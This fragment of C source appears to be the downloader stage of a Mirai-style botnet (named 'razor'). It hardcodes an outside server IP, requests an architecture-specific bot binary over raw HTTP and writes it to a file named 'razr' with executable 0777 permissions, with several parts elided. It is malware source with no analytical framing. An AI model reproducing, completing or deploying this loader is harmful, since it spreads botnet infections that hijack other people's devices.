...
#define HTTP_SERVER utils_inet_addr(178,63,167,44) //ip: 127,0,0,1

#define EXEC_MSG            "Razor\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "razr\n"
...
inline void run(void)
{
    ...
    ffd = open("razr", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /razor/r4z0r." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
